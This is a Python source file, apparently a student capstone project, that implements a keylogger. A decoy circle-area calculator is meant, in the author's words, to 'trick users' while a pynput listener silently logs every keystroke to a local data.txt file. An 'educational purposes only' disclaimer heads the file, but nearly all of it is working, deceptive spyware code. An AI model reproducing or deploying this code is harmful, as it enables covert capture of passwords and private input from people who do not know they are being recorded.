"""
Author: Patrick Mitchell
Class: Capstone
Professor: Anup Parajulii
School: Lake Superior College
This program is intended for educational purposes only. This program captures keystrokes of local user when this script is executed.
This program can cause harms to others so It is important to treat it as a tool and not a weapon.
I am in no way responsible for any damages this program may or may not cause.
"""

import logging#To assist in the logging process with helpful functions
from pynput.keyboard import Key, Listener#This allows the Key function and listener function to be imported


class Fakeprogram(object):
    def radius():
        print("Enter the Radius of Circle: ")

        r = float(input())

        a = 3.14*r**2

        print("\nArea = ", a)

    radius()

"""This fake program is to trick users to what is actually going on behind the scenes."""


class Keygrabber(object):#This class is to hold the defined on_press function
    log_dir = ""
#This logging.basicConfig function purpose is to put the logged data into the data.txt file
    logging.basicConfig(filename=(log_dir + "data.txt"), \
        level=logging.DEBUG,)
    logging.warning('Currently listening for input:')#To show that program is currently listening for input in logs text file




def on_press(key):#Defined function that allows pressed keys to be logged into text file
    logging.info(str(key))
on_press(Key)



def payload():
    with Listener(on_press=on_press) as listener:#This is how the information is gathered through this simple server
        listener.join()#This joins the listener allowing the program to gather input
payload()



    
